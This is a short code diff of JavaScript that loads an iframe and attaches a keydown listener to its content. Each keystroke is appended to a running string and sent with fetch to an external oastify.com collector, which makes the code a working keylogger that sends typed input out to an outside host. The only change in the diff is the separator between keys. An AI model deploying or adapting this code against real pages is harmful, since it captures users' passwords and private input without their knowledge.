@@ -9,7 +9,7 @@ iframe.style.border = 'none';
 iframe.onload = function () {
     console.log('Iframe has loaded successfully!');
     iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
-    currSession += String(event.key)
+    currSession += `++${String(event.key)}`
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
 });
 };
